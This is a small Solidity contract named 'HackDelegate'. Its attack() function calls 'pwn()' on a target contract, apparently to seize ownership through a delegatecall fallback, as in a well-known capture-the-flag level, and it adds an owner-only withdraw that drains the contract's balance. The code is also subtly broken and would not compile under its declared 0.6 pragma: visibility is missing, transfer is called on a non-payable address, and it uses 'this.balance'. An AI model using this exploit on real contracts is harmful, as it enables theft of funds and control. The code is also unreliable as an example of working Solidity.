// SPDX-License-Identifier: unlicensing
pragma solidity ^0.6.0;

contract HackDelegate {
    address public target;
    address public owner;

    constructor(address _target) {
        target = _target;
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function withdraw() payable onlyOwner {
        owner.transfer(this.balance);
    }

    function attack() public {
        target.call(abi.encodeWithSignature("pwn()"));
    }
}
